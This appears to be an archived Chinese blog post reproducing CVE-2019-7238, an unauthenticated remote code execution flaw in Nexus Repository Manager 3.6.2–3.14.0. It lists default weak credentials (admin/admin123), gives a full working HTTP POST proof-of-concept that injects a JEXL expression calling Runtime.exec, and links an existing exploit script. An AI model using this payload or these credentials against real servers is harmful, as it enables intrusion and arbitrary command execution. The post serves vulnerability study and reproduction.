# Nexus Repository Manager 3(CVE-2019-7238) 远程代码执行漏洞复现 - 小丸子 3689 - 博客园

> 原文：[`www.cnblogs.com/ffx1/p/12653565.html`](https://www.cnblogs.com/ffx1/p/12653565.html)

![image.png](img/138b84d989c19a086a0c8be74cfc3ca3.png)

### 0x00 漏洞背景

Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发 Maven，NuGET 等软件源仓库。其 3.14.0 及之前版本中，存在一处基于 OrientDB 自定义函数的任意 JEXL 表达式执行功能，而这处功能存在未授权访问漏洞，将可以导致任意命令执行漏洞。2019 年 2 月 5 日 Sonatype 发布安全公告，在 Nexus Repository Manager 3 中由于存在访问控制措施的不足，未授权的用户可以利用该缺陷构造特定的请求在服务器上执行 Java 代码，从而达到远程代码执行的目的。

### 0x01 影响范围

Nexus Repository Manager OSS/Pro 3.6.2 版本到 3.14.0 版本

### 0x02 漏洞复现

1.  未授权访问+弱口令访问
2.  jar 包上传
3.  Exploit

#### step1：未授权访问+弱口令访问

nexus 默认端口为 8081，且存在未授权访问（3.15 起关闭此功能），通过弱口令 admin/admin123 进入

![image.png](img/c56939a06db0cb73d84c3b207c096a9f.png)

#### step2：上传 jar 包

而真实环境则不需要，因为真实环境已经上传了 assert
![image.png](img/89f47ef82a1c9ee2bab476c0492810b7.png)

#### step3：Exploit

poc：

```
POST /service/extdirect HTTP/1.1
Host:127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Content-Type: application/json
Content-Length: 308
Connection: close

{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":25,"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":4} 
```

![image.png](img/4d551313e6d79ab37692ae1a1d67ffdc.png)

或者用有 dalao 写好的 exp：[`github.com/mpgn/CVE-2019-7238`](https://github.com/mpgn/CVE-2019-7238)

![image.png](img/c059ac8d78f8ec73bc5f9dc40d73a35d.png)

![image.png](img/cabefb91f7e500804717c5398305dee2.png)